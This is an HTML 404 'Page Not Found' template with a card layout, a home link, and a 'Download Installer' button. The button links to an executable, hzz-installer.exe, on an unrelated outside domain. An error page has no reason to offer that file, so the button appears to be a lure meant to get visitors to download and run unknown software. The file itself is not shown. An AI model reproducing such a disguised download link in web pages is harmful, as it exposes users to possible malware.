<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>404 - Page Not Found</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background: #f5f7fb;
      color: #333;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .card {
      background: #fff;
      max-width: 600px;
      width: 100%;
      padding: 40px;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0,0,0,.08);
      text-align: center;
    }

    h1 {
      font-size: 5rem;
      color: #2563eb;
      margin-bottom: 10px;
    }

    h2 {
      margin-bottom: 15px;
      color: #222;
    }

    p {
      color: #666;
      line-height: 1.7;
      margin-bottom: 30px;
    }

    .button-group {
      display: flex;
      gap: 15px;
      justify-content: center;
      flex-wrap: wrap;
    }

    .btn {
      display: inline-block;
      text-decoration: none;
      background: #2563eb;
      color: white;
      padding: 12px 22px;
      border-radius: 8px;
      font-weight: 600;
      transition: .2s ease;
    }

    .btn:hover {
      background: #1d4ed8;
      transform: translateY(-2px);
    }

    .btn.secondary {
      background: #e5e7eb;
      color: #333;
    }

    .btn.secondary:hover {
      background: #d1d5db;
    }

    .code {
      margin-top: 30px;
      background: #f3f4f6;
      border-radius: 8px;
      padding: 12px;
      font-family: Consolas, monospace;
      font-size: .9rem;
      color: #555;
      overflow-x: auto;
    }
  </style>
</head>
<body>

<div class="card">
  <h1>404</h1>

  <h2>Page Not Found</h2>

  <p>
    The page you're looking for doesn't exist, may have been moved,
    or the URL was typed incorrectly.
  </p>

  <div class="button-group">
    <a class="btn" href="/">← Back to Home</a>
    <a class="btn secondary"
       href="https://hzz.cupx.in/install/hzz-installer.exe">
      Download Installer
    </a>
  </div>

  <div class="code">
    Error 404 • Resource Not Found
  </div>
</div>

</body>
</html>
